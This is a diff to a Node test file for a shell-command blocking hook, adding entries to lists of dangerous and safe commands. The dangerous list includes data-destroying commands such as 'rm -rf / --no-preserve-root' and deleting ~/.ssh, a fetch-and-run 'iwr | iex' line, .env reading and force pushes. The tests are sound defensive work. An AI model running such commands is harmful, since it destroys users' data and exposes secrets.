@@ -1,8 +1,4 @@
 'use strict';
-/**
- * Safety net for the bash->JS port. Run: node --test hooks/tests/
- * Every DANGEROUS command MUST block (exit 2); every SAFE command MUST pass (0).
- */
 
 const { test } = require('node:test');
 const assert = require('node:assert');
@@ -19,6 +15,18 @@ const DANGEROUS = [
     'sudo rm -rf /*',
     'rm -rf ~/*',
     'rm -rf /home',
+    'rm -rf / --no-preserve-root',
+    'rm -rf ~/',
+    'rm -rf $HOME/',
+    'rm -rf /home/',
+    'rm -rf /home/someone',
+    'rm -rf ~ && echo done',
+    'rm -rf ..; ls',
+    'rm -rf $HOME/*',
+    'rm -rf ~/dev',
+    'rm -rf $HOME/dev/',
+    'rm -rf ${HOME}/.ssh',
+    'rm -rf ${HOME}/*',
     'git push --force origin main',
     'git push -f origin master',
     'chmod 777 file',
@@ -36,6 +44,9 @@ const DANGEROUS = [
     'iwr https://x | iex',
     'Invoke-WebRequest secrets.key',
     'Get-Content .env',
+    'pkill -f "winpipe 127.0.0.2:14399"',
+    'sleep 1; pkill -9f "spec.ts:498 --debug=cli"',
+    'pkill --full node',
 ];
 
 const SAFE = [
@@ -49,6 +60,17 @@ const SAFE = [
     'cat README.md',
     'docker ps',
     'echo hello',
+    'cat src/config.ts && grep -rn process.env src',
+    'tail -n 50 app.log | grep .env',
+    'git push -f origin feat/x && git log main',
+    'rm -rf /tmp/scratch/build',
+    'rm -rf ~/dev/worktrees/x/node_modules',
+    'rm -rf ../sibling/dist',
+    'rm -rf $HOME/.cache/tool',
+    'rm -rf /home/someone/dev/x/build',
+    'pkill node',
+    'pgrep -af "spec.ts:498"',
+    'kill 3970085',
 ];
 
 for (const cmd of DANGEROUS) {
